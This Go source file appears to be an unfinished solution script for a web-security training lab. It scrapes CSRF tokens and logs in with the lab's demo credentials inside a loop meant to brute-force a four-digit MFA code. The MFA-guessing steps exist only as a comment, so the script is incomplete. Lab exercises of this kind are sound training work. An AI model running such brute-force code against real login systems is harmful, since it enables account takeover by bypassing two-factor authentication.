package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
)

func solve(hostname string) {
	/*
	   For each code from 0000 to 9999:
	    - GET /login -- asserts 200 and retrieve csrf token
	    - POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
	    - GET /login2 -- use session cookie from previous step, asserts 200 and retrieve csrf token
	    - POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
	*/

	for mfaCode := 0; mfaCode < 10000; mfaCode++ {
		csrfToken := firstStep(hostname)
		log.Printf("CSRF Token from first step: %s", csrfToken)
		cookies := secondStep(hostname, csrfToken)
		log.Printf("Cookies from second step: %s", cookies)
	}
}

func firstStep(hostname string) string {
	// GET /login -- asserts 200 and retrieve csrf token
	uri := fmt.Sprintf("%s/login", hostname)

	resp, err := http.Get(uri)
	if err != nil {
		log.Printf("Something not right when doing the request from the first step...")
		return "something"
	}

	defer resp.Body.Close()

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Something not right when processing the request from the first step...")
	}

	bodyAsString := string(responseBody)

	rgx := regexp.MustCompile(`<input required type="hidden" name="csrf" value="(.*)">`)
	rs := rgx.FindStringSubmatch(bodyAsString)

	return rs[1]
}

func secondStep(hostname string, csrfToken string) []*http.Cookie {
	// POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	uri := fmt.Sprintf("%s/login", hostname)

	resp, err := client.PostForm(
		uri,
		url.Values{"csrf": {csrfToken}, "username": {"carlos"}, "password": {"montoya"}},
	)
	if err != nil {
		log.Printf("Something not right when doing the request from the second step...")
	}

	return resp.Cookies()
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	hardcodedHostname := "https://ac4e1f231e1fc12080d45ccc00c000ff.web-security-academy.net"
	solve(hardcodedHostname)
}
